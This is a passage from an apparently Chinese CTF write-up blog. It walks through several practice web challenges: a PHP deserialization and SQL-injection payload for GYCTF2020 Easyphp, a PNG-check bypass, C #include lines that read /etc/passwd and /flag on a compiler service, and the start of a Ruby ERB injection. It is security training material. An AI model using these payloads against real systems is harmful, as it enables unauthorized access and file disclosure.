        $this-&amp;gt;nickname = &amp;quot;2&amp;quot;;
        //$this-&amp;gt;CtrlCase=new dbCtrl();
        //$this-&amp;gt;CtrlCase=new User();
    &amp;#125;
&amp;#125;
class User
&amp;#123;
    public $id=&amp;quot;1&amp;quot;;
    public $age;
    public $nickname;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;age=&#39;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&#39;;
        $this-&amp;gt;nickname=new Info();
        //$this-&amp;gt;nickname-&amp;gt;CtrlCase=new User();
    &amp;#125;
&amp;#125;
Class UpdateHelper&amp;#123;
    public $sql;
&amp;#125;

class dbCtrl
&amp;#123;
    public $hostname=&amp;quot;127.0.0.1&amp;quot;;
    public $dbuser=&amp;quot;root&amp;quot;;
    public $dbpass=&amp;quot;root&amp;quot;;
    public $database=&amp;quot;test&amp;quot;;
    public $name=&amp;quot;admin&amp;quot;;
    public $password=&amp;quot;1&amp;quot;;
    public $mysqli;
    public $token;
    public $feng;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;feng=new UpdateHelper();
        //$this-&amp;gt;token=&amp;quot;admin&amp;quot;;
    &amp;#125;
&amp;#125;
$a=new Info();
$a-&amp;gt;CtrlCase=new dbCtrl();
$a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql=new User();
$a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql-&amp;gt;nickname-&amp;gt;CtrlCase=new User();
//var_dump($a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql-&amp;gt;nickname);
//var_dump($a);
echo serialize($a);


&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;age=&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunionunionunionunionunionunionunionunionload1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;O:4:&amp;quot;User&amp;quot;:3:&amp;#123;s:2:&amp;quot;id&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:72:&amp;quot;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:4:&amp;quot;User&amp;quot;:3:&amp;#123;s:2:&amp;quot;id&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:72:&amp;quot;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;N;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;amp;username=admin&amp;amp;password=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最终成功得到 flag：&lt;/p&gt;
&lt;p&gt;最终成功得到 flag：&lt;/p&gt;
&lt;p&gt;参考链接：[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlci9hcnRpY2xlL2RldGFpbHMvMTE0NTI1OTUx&#34;&gt;GYCTF2020] Easyphp-CSDN 博客&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;harekazectf2019avatar-uploader-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#harekazectf2019avatar-uploader-1&#34;&gt;#&lt;/a&gt; [HarekazeCTF2019]Avatar Uploader 1&lt;/h2&gt;
&lt;p&gt;[HarekazeCTF2019]Avatar Uploader 1&lt;br&gt;
 参考文章&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNjcxMzc5L2FydGljbGUvZGV0YWlscy8xMjQwNTIwNDY=&#34;&gt;点这&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BHarekazeCTF2019%5DAvatarUploader1/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先输入用户登录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BHarekazeCTF2019%5DAvatarUploader1/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;要求上传小于 256kB 且小于 256px*256px 的 PNG 图片。&lt;br&gt;
上传做头像&lt;/p&gt;
&lt;p&gt;试着传🐎发现没用，没有任何回响&lt;/p&gt;
&lt;p&gt;只能去看源码来了&lt;br&gt;
最主要的还是 upload.php&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);

require_once(&#39;config.php&#39;);
require_once(&#39;lib/util.php&#39;);
require_once(&#39;lib/session.php&#39;);

$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;文件包含&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// check whether file is uploaded
if (!file_exists($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]) || !is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])) &amp;#123;
  error(&#39;No file was uploaded.&#39;);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;判断是否上传文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// check file size
if ($_FILES[&#39;file&#39;][&#39;size&#39;] &amp;gt; 256000) &amp;#123;
  error(&#39;Uploaded file is too large.&#39;);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;判断文件大小，不得大于 256kB&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// check file type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($finfo, $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
finfo_close($finfo);
if (!in_array($type, [&#39;image/png&#39;])) &amp;#123;
  error(&#39;Uploaded file is not PNG format.&#39;);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;判断是否上传 png 文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// check file width/height
$size = getimagesize($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
if ($size[0] &amp;gt; 256 || $size[1] &amp;gt; 256) &amp;#123;
  error(&#39;Uploaded image is too large.&#39;);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;getimagesize () 函数用于获取图像大小及相关信息，成功将返回一个数组&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BHarekazeCTF2019%5DAvatarUploader1/3.png&#34; alt=&#34;3&#34;&gt;&lt;br&gt;
 判断图像宽度 (0) 小于 256px，高度 (1) 也小于 256px&lt;/p&gt;
&lt;p&gt;getimagesize () 函数用于获取图像大小及相关信息，成功将返回一个数组，&lt;br&gt;
判断图像宽度 (0) 小于 256px，高度 (1) 也小于 256px&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if ($size[2] !== IMAGETYPE_PNG) &amp;#123;
  // I hope this never happens...
  error(&#39;What happened...? OK, the flag for part 1 is: &amp;lt;code&amp;gt;&#39; . getenv(&#39;FLAG1&#39;) . &#39;&amp;lt;/code&amp;gt;&#39;);
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;$size [2] 不是 PNG 文件，将输出 part 1 的 flag&lt;br&gt;
getenv — 获取一个环境变量的值&lt;br&gt;
这个 if 应该就是突破点&lt;/p&gt;
&lt;p&gt;// ok&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$filename = bin2hex(random_bytes(4)) . &#39;.png&#39;;
move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], UPLOAD_DIR . &#39;/&#39; . $filename);

$session-&amp;gt;set(&#39;avatar&#39;, $filename);
flash(&#39;info&#39;, &#39;Your avatar has been successfully updated!&#39;);
redirect(&#39;/&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据源码分析，想要得到 flag 就要执行第五个 if 语句&lt;br&gt;
图片要求为 png 文件头且不得大于 256kB，宽度 (0) 小于 256px，高度 (1) 也小于 256px&lt;br&gt;
$size [2] 不是 PNG 文件，将输出 part 1 的 flag&lt;br&gt;
png 文件头，宽度和高度可控&lt;br&gt;
输出测试：&lt;/p&gt;
&lt;p&gt;根据源码分析，想要得到 flag 就要执行第五个 if 语句&lt;br&gt;
图片要求为 png 文件头且不得大于 256kB，宽度 (0) 小于 256px，高度 (1) 也小于 256px&lt;br&gt;
$size [2] 不是 PNG 文件，将输出 part 1 的 flag&lt;br&gt;
png 文件头，宽度和高度可控&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BHarekazeCTF2019%5DAvatarUploader1/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;输出测试：&lt;/p&gt;
&lt;p&gt;根据源码分析，想要得到 flag 就要执行第五个 if 语句&lt;br&gt;
图片要求为 png 文件头且不得大于 256kB，宽度 (0) 小于 256px，高度 (1) 也小于 256px&lt;br&gt;
$size [2] 不是 PNG 文件，将输出 part 1 的 flag&lt;br&gt;
png 文件头，宽度和高度可控&lt;br&gt;
输出测试：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
list($width, $height, $type, $attr) = getimagesize(&amp;quot;444.png&amp;quot;);
echo &amp;quot;宽度为：&amp;quot; . $width;
echo &amp;quot;高度为：&amp;quot; . $height;
echo &amp;quot;类型为：&amp;quot; . $type;
echo &amp;quot;属性：&amp;quot; . $attr;
var_dump(getimagesize(&amp;quot;444.png&amp;quot;));
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BHarekazeCTF2019%5DAvatarUploader1/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;$size [2] 不是 PNG 文件，将输出 part 1 的 flag 与前几项要求产生矛盾&lt;br&gt;
所以只能上传一个有 png 文件头，但是又不是 png 文件的图片&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BHarekazeCTF2019%5DAvatarUploader1/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;这样在第五个 if 语句时就满足条件输出 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BHarekazeCTF2019%5DAvatarUploader1/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;

 &lt;h2 id=&#34;fireshellctf2020caas-c的预处理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fireshellctf2020caas-c的预处理&#34;&gt;#&lt;/a&gt; [FireshellCTF2020] Caas C 的预处理&lt;/h2&gt;
&lt;h2 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/1.png&#34; alt=&#34;1&#34;&gt;&lt;/h2&gt;
&lt;p&gt;进入可以看到是一个编译器 ，输入简单的 php 代码试试&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;不知道什么的报错，直接复制报错代码&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTclOTklQkUlRTUlQkElQTYlRTQlQjglODAlRTQlQjglOEImYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;百度一下&lt;/span&gt;看看（仔细地可以看见最前面有一个后缀.c）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现清一色的 C 语言报错，那我们找个 c 语言代码传进去试试&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;  &lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;     &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;hello, world&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;下载出来一个不知什么文件&lt;/p&gt;
&lt;p&gt;思路到这里就断了，其实可以猜到 flag 在服务器的某个文件下，也许就是 /flag，但是不知道怎么读取，难道是一个 c 语言漏洞么，感觉给出的文件又看不懂&lt;/p&gt;
&lt;p&gt;看了别人的考的是 c 语言的预处理&lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用 include 预处理将我们所需的文件包含进来&lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;试试&lt;/p&gt;
&lt;figure class=&#34;highlight objectivec&#34;&gt;&lt;figcaption data-lang=&#34;Objective-C&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token char&#34;&gt;&#39;etc/passwd&#39;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;叫我们用 &amp;lt;&amp;gt; 或者双引号包含文件名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现报错了，但是仔细看文件内容已经出来了&lt;/p&gt;
&lt;figure class=&#34;highlight cobol&#34;&gt;&lt;figcaption data-lang=&#34;cobol&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;#include &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;proc&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;self&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;cmdline&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; 看一下执行什么命令&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;用处不大&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1jd2QmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;cwd&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接 /flag ，发现尖括号报错信息没出来，但是双引号可以&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BFireshellCTF2020%5DCaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;p&gt;上面那个 cwd 之所以出不来是因为我们 include 是包含一个文件而不是 cwd 目录，/proc/self/cwd 返回的当前目录有哪些文件&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU0OTI5ODkxL2FydGljbGUvZGV0YWlscy8xMjQ3ODE3NDk=&#34;&gt;https://blog.csdn.net/qq_54929891/article/details/124781749&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;sctf2019flag-shop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sctf2019flag-shop&#34;&gt;#&lt;/a&gt; [SCTF2019]Flag Shop&lt;/h2&gt;
&lt;h2 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/1.png&#34; alt=&#34;1&#34;&gt;&lt;/h2&gt;
&lt;p&gt;点击 buy flag 试试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;提示没有足够的 jkl&lt;/p&gt;
&lt;p&gt;这里可以点击 work 去赚取 jkl&lt;/p&gt;
&lt;p&gt;正常点击要攒到 flag 怕是不可能，buu 请求过快也会报错&lt;/p&gt;
&lt;p&gt;先抓包看看吧&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里不能修改 work 赚取的 jkl，尝试把 cookie 解码看看：直接修改发现出错，有密码。重新开始审计：&lt;/p&gt;
&lt;p&gt;又回到最开始的地方。。&lt;/p&gt;
&lt;p&gt;扫描一下有没有源码泄露之类的&lt;/p&gt;
&lt;p&gt;发现 robots.txt&lt;/p&gt;
&lt;p&gt;访问发现有 /filebak&lt;/p&gt;
&lt;p&gt;发现 ruby 代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;require &#39;sinatra&#39;
require &#39;sinatra/cookies&#39;
require &#39;sinatra/json&#39;
require &#39;jwt&#39;
require &#39;securerandom&#39;
require &#39;erb&#39;

set :public_folder, File.dirname(__FILE__) + &#39;/static&#39;

FLAGPRICE = 1000000000000000000000000000
ENV[&amp;quot;SECRET&amp;quot;] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + &#39;/../log/http.log&#39;,&amp;quot;a+&amp;quot;)
  file.sync = true
  use Rack::CommonLogger, file
end

get &amp;quot;/&amp;quot; do
  redirect &#39;/shop&#39;, 302
end

get &amp;quot;/filebak&amp;quot; do
  content_type :text
  erb IO.binread __FILE__
end

get &amp;quot;/api/auth&amp;quot; do
  payload = &amp;#123; uid: SecureRandom.uuid , jkl: 20&amp;#125;
  auth = JWT.encode payload,ENV[&amp;quot;SECRET&amp;quot;] , &#39;HS256&#39;
  cookies[:auth] = auth
end

get &amp;quot;/api/info&amp;quot; do
  islogin
  auth = JWT.decode cookies[:auth],ENV[&amp;quot;SECRET&amp;quot;] , true, &amp;#123; algorithm: &#39;HS256&#39; &amp;#125;
  json(&amp;#123;uid: auth[0][&amp;quot;uid&amp;quot;],jkl: auth[0][&amp;quot;jkl&amp;quot;]&amp;#125;)
end

get &amp;quot;/shop&amp;quot; do
  erb :shop
end

get &amp;quot;/work&amp;quot; do
  islogin
  auth = JWT.decode cookies[:auth],ENV[&amp;quot;SECRET&amp;quot;] , true, &amp;#123; algorithm: &#39;HS256&#39; &amp;#125;
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV[&amp;quot;SECRET&amp;quot;].match(&amp;quot;#&amp;#123;params[:SECRET].match(/[0-9a-z]+/)&amp;#125;&amp;quot;)
      puts ENV[&amp;quot;FLAG&amp;quot;]
    end
  end

  if params[:do] == &amp;quot;#&amp;#123;params[:name][0,7]&amp;#125; is working&amp;quot; then

    auth[&amp;quot;jkl&amp;quot;] = auth[&amp;quot;jkl&amp;quot;].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV[&amp;quot;SECRET&amp;quot;] , &#39;HS256&#39;
    cookies[:auth] = auth
    ERB::new(&amp;quot;&amp;lt;script&amp;gt;alert(&#39;#&amp;#123;params[:name][0,7]&amp;#125; working successfully!&#39;)&amp;lt;/script&amp;gt;&amp;quot;).result

  end
end

post &amp;quot;/shop&amp;quot; do
  islogin
  auth = JWT.decode cookies[:auth],ENV[&amp;quot;SECRET&amp;quot;] , true, &amp;#123; algorithm: &#39;HS256&#39; &amp;#125;

  if auth[0][&amp;quot;jkl&amp;quot;] &amp;lt; FLAGPRICE then

    json(&amp;#123;title: &amp;quot;error&amp;quot;,message: &amp;quot;no enough jkl&amp;quot;&amp;#125;)
  else

    auth &amp;lt;&amp;lt; &amp;#123;flag: ENV[&amp;quot;FLAG&amp;quot;]&amp;#125;
    auth = JWT.encode auth,ENV[&amp;quot;SECRET&amp;quot;] , &#39;HS256&#39;
    cookies[:auth] = auth
    json(&amp;#123;title: &amp;quot;success&amp;quot;,message: &amp;quot;jkl is good thing&amp;quot;&amp;#125;)
  end
end


def islogin
  if cookies[:auth].nil? then
    redirect to(&#39;/shop&#39;)
  end
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;稍微看了下&lt;/p&gt;
&lt;p&gt;发现要 do 和 name 一致才能够弹出 secret&lt;/p&gt;
&lt;p&gt;这里考察 Ruby ERB 注入（参考： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pkcTAzOTQxMjMvYXJ0aWNsZS9kZXRhaWxzLzg0NDM2OTQlRUYlQkMlODk=&#34;&gt;https://blog.csdn.net/zdq0394123/article/details/8443694）&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;unless&lt;/span&gt; params&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token symbol&#34;&gt;:SECRET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;ENV&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;SECRET&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;match&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token delimiter punctuation&#34;&gt;#&amp;#123;&lt;/span&gt;&lt;span class=&#34;token content&#34;&gt;params&lt;span 